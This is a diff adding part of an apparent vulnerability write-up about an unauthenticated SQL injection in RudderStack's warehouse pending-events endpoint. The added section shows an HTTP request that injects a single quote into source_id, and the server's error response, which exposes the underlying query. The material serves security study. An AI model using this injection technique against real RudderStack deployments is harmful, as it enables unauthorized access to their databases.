@@ -261,3 +261,34 @@ This creates a SQL statement on lines `1785` through `1796`, using `Sprintf()`. 
 Since we can control the value of `sourceOrDestId` from our unauthenticated request, we should be able to exploit this SQL injection vulnerability. We'll explore the exploitation technique in the next section.
 
 ### Exploiting the SQL Injection Vulnerability
+Let's verify that we can manipulate the SQL query. In *Repeater*, we'll update the `source_id` value to include a single quote (`'`) and then *Send* the request.
+```text
+POST /v1/warehouse/pending-events?triggerUpload=true HTTP/1.1
+Host: rudderstack:8080
+Content-Type: application/json
+Content-Length: 43
+
+{
+"source_id": "'",
+"task_run_id": "1"
+}
+```
+Response received:
+```text
+HTTP/1.1 500 Internal Server Error
+Content-Length: 227
+Content-Type: text/plain; charset=utf-8
+Date: Thu, 31 Jul 2025 19:40:15 GMT
+Vary: Origin
+X-Content-Type-Options: nosniff
+
+error getting pending staging file count : query: 
+		SELECT 
+		  MAX(end_staging_file_id) 
+		FROM 
+		  wh_uploads 
+		WHERE 
+		  wh_uploads.source_id = ''';
+ failed with Error : pq: unterminated quoted string at or near "''';
+"
+```
